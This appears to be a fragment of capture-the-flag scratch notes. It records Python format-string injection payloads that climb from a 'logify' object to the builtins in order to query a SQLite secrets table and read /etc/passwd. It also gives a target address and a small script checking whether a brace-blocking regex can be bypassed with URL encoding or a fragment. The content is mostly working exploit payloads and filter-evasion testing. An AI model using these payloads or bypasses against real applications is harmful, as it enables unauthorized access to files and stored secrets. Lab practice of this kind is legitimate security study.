#%7Blogify.__init__.__globals__.__builtins__.__import__('sqlite3').connect('history.db').execute('SELECT%20secret%20FROM%20secrets%20WHERE%20name=%22oldest_user_of_bartender%22').fetchone()[0]%7D


http://94.237.122.188:43091/log'

{logify.__init__.__globals__.__builtins__.__import__('sqlite3').connect('history.db').execute('SELECT secret FROM secrets WHERE name="oldest_user_of_bartender"').fetchone()[0]}

payload = "{logify.__init__.__globals__.__builtins__.open('/etc/passwd').read()}"





import re

# Test the PHP regex
test_urls = [
    "http://example.com/{test}",
    "http://example.com/%7Btest%7D",
    "http://example.com/#{test}",
    "http://example.com/#%7Btest%7D"
]

for url in test_urls:
    if re.search(r'[{}]', url):
        print(f"BLOCKED: {url}")
    else:
        print(f"ALLOWED: {url}")
